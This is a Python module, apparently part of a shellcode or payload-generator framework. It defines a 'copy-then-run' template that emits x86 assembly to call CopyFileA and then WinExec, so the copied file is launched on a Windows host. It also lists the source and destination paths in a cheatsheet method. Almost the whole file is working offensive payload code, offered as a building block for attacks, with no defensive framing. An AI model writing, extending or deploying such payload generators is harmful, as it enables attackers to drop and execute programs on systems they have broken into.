"""Copy-then-run payload template.

Copies a file to a destination path, then executes it via WinExec.
dst_path serves double duty: it is the copy destination AND the command line.

Requires functions: CopyFileA, WinExec
Requires string slots: src_path, dst_path
"""
from __future__ import annotations

from .base import PayloadTemplate, TemplateConfig


class CopyThenRunTemplate(PayloadTemplate):

    def emit(self, layout, config: TemplateConfig) -> str:
        copyfile = layout.slot("CopyFileA").ebp_ref
        winexec  = layout.slot("WinExec").ebp_ref

        try:
            src = layout.slot("src_path").ebp_ref
            dst = layout.slot("dst_path").ebp_ref
        except KeyError as e:
            raise ValueError(
                f"CopyThenRunTemplate requires 'src_path' and 'dst_path' string slots. "
                f"Missing: {e}"
            ) from e

        return "\n".join([
            "; ── Copy Then Run Payload ───────────────────────────────────────",
            "",
            "    ; CopyFileA(&src_path, &dst_path, bFailIfExists=FALSE)",
            f"    lea  eax, {src}",
            f"    lea  ebx, {dst}",
            "    xor  ecx, ecx             ; bFailIfExists = FALSE",
            "    push ecx",
            "    push ebx                  ; lpNewFileName",
            "    push eax                  ; lpExistingFileName",
            f"    call dword ptr {copyfile}",
            "",
            "    ; WinExec(&dst_path, SW_SHOWNORMAL)",
            f"    lea  eax, {dst}",
            "    push 0x1                  ; uCmdShow = SW_SHOWNORMAL",
            "    push eax                  ; lpCmdLine = dst_path",
            f"    call dword ptr {winexec}",
            "",
        ])

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        return [
            ("Source path", config.src_path),
            ("Destination path (also executed)", config.dst_path),
        ]
